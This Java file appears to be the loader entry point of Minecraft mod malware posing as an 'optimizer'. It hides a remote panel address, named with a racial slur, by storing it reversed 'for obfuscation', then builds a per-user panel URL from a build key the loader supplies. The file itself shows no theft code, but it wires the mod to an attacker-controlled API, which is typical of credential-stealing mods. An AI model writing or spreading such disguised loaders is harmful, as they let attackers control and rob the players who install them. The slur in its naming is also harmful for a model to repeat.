/*
 * Main - Entry point when loaded via Loader
 * Called by loader with context containing userId (build key)
 */
package com.example.optimizer;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

/**
 * Entry point for loader. Mirrors reference: Main.initializeNiggaware(context)
 */
public class Main {

    // Base URL for panel API (reversed for obfuscation)
    // Actual: https://niggaware.ru/api/data/
    private static final String PANEL_BASE = new StringBuilder("/atad/ipa/ur.erawaggin//:sptth").reverse().toString();

    private static String loaderBuildKey = null;
    private static String constructedPanelUrl = null;
    private static boolean initializedViaLoader = false;

    /**
     * Called by loader with context JSON
     * Context contains: userId (build key only), executionEnvironment,
     * minecraftInfo
     */
    public void initializeNiggaware(String contextJson) {
        try {
            System.out.println("[OPTIMIZER] Main.initializeNiggaware() called");

            JsonObject context = new Gson().fromJson(contextJson, JsonObject.class);

            // Extract userId (this is now just the build key, not full URL)
            if (context.has("userId")) {
                loaderBuildKey = context.get("userId").getAsString();
                // Construct full panel URL from build key
                constructedPanelUrl = PANEL_BASE + loaderBuildKey;
                initializedViaLoader = true;
                System.out.println("[OPTIMIZER] Build key received, panel URL constructed");
            }

            // Initialize mod components
            LoaderEntry.initialize(contextJson);

        } catch (Exception e) {
            System.err.println("[OPTIMIZER] Main initialization failed: " + e.getMessage());
        }
    }

    /**
     * Get the constructed panel URL (build key converted to full URL)
     */
    public static String getLoaderPanelUrl() {
        return constructedPanelUrl;
    }

    /**
     * Get raw build key from loader context
     */
    public static String getLoaderBuildKey() {
        return loaderBuildKey;
    }

    /**
     * Check if loaded via loader
     */
    public static boolean isLoadedViaLoader() {
        return initializedViaLoader;
    }
}
